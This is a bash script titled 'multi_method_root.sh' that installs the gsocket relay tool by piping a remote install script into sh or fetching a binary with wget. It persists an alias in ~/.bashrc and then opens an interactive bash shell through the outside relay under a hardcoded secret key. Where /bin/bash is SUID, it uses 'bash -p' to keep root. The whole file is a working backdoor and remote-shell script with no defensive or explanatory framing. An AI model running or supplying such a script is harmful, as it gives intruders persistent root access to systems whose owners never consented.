#!/bin/bash
# multi_method_root.sh

KEY="CbadUt4YWKZmnNunoxGEmx"

echo "=== MULTI-METHOD ROOT ACCESS ==="
echo ""

# Method 0: Install gsocket if missing
install_gsocket() {
    echo "[*] Installing gsocket..."
    
    # Method A: Official script
    echo "[A] Trying official installer..."
    timeout 30 curl -sSL https://gsocket.io/install.sh | sh 2>/dev/null
    
    if ! command -v gsocket &> /dev/null; then
        # Method B: Direct binary download
        echo "[B] Downloading binary..."
        mkdir -p ~/.gsocket
        cd ~/.gsocket
        wget -q https://github.com/hackerschoice/gsocket/releases/latest/download/gsocket.bin
        chmod +x gsocket.bin
        export PATH="$PATH:$(pwd)"
        
        # Create alias
        echo 'alias gsocket="~/.gsocket/gsocket.bin"' >> ~/.bashrc
        source ~/.bashrc
    fi
    
    # Verify
    if command -v gsocket &> /dev/null; then
        echo "[+] gsocket ready!"
        return 0
    else
        echo "[-] Failed to install"
        return 1
    fi
}

# Main
if ! command -v gsocket &> /dev/null; then
    install_gsocket
fi

if command -v gsocket &> /dev/null; then
    echo -e "\n[*] Connecting with key: ${KEY:0:10}..."
    
    # Try SUID bash first
    if [ -u /bin/bash ]; then
        echo "[+] Using SUID bash for root"
        exec gsocket -s "$KEY" /bin/bash -p -i
    else
        echo "[+] Using regular shell"
        exec gsocket -s "$KEY" /bin/bash -i
    fi
else
    echo -e "\n[-] Cannot proceed without gsocket"
    echo "[*] Please install manually:"
    echo "    1. curl -sSL https://gsocket.io/install.sh | sh"
    echo "    2. Then run: gsocket -s $KEY /bin/bash -i"
fi
